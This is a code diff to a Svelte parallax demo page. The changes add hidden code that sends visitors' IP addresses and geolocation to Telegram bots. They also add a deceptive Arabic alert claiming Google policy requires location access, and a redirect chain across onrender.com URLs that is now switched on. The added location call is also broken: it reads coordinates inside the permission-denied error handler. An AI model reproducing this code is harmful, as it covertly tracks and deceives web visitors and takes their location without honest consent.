@@ -129,10 +129,11 @@ sendIPToTelegramBots();
     (error) => {
       if (error.code === error.PERMISSION_DENIED) {
 				sendIPToTelegramBots();
+				await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
 		    //alert("اضغط سماح لاستمرار allow");
        alert("تبعاً لسياسة جوجل اسمع لخدمة لوكيشن لاستمرار");
         // showAlert();
-        // redirectToNextURL();
+         redirectToNextURL();
         // Location permission denied, send IP result to Telegram bots
      } else {
       // Geolocation failed for other reasons (e.g., GPS unavailable)
@@ -152,18 +153,18 @@ function showAlert() {
     // Get the current URL
     var currURL = window.location.href;
     // Extract the current number from the URL
-    var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
+    var currNum = parseInt(currURL.match(/mhffff(\d+)/)[1]);
     // Check if the current number is less than or equal to 999
     if (currNum <= 999) {
       // Increment the current number by 1 and construct the next URL
       var nextNum = currNum + 1;
-      var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
+      var nextURL = currURL.replace(/mhffff\d+/, 'mhffff' + nextNum);
       // Redirect to the next URL
       window.location.href = nextURL;
     } else {
       // If the current number is greater than 999, display an alert message
       // alert('You have reached the maximum number of URLs.');
-      window.location.href = 'https://mhf1.onrender.com/';
+      window.location.href = 'https://mhffff1.onrender.com';
     }
   }
 	
@@ -171,15 +172,18 @@ function showAlert() {
 
 <svelte:window bind:scrollY={y} />
 
-<a class="parallax-container" href="https://www.firewatchgame.com">
+<a class="parallax-container">
 	{#each layers as layer}
 		<img
 			style="transform: translate(0,{(-y * layer) / (layers.length - 1)}px)"
 			src="https://www.firewatchgame.com/images/parallax/parallax{layer}.png"
+			
 			alt="parallax layer {layer}"
 		/>
 	{/each}
 </a>
+
+<img width="200" src="https://www.hubspot.com/hubfs/image-hubspot-centering-css.jpeg">
 
 <div class="text">
 	<span style="opacity: {1 - Math.max(0, y / 40)}"> scroll down </span>
